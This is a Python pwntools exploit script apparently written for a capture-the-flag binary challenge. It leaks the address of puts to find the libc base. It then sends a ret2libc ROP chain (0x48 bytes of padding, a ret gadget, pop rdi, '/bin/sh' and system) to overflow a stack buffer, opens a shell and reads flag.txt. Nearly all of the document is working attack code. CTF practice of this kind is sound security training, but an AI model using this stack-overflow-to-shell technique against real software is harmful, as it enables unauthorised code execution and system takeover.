#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
ld = ELF('/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = [
    'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
  ]
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

'''
  Arch:       amd64-64-little
  RELRO:      Full RELRO
  Stack:      No canary found
  NX:         NX enabled
  PIE:        PIE enabled
  Stripped:   No
'''

# ===================================== #

p.sendline(b'puts')
p.sendline(b'system')
p.sendline(b'scanf')

p.recvuntil(b'puts @ ')
libc.address = int(p.recvline()[:-1].strip(), 16) - libc.sym.puts
print(f"libc base : {hex(libc.address)}")

p.sendline(b'guezz')

rop = ROP(libc)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
ropchain = b'A' * 0x48 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter(b'guess: ', ropchain)

sleep(0.25)
p.sendline(b'cat flag.txt')

p.interactive()

# NOTE:
# Guess the libc using (libc.rip)
# Buffer Overflow (ret2libc)
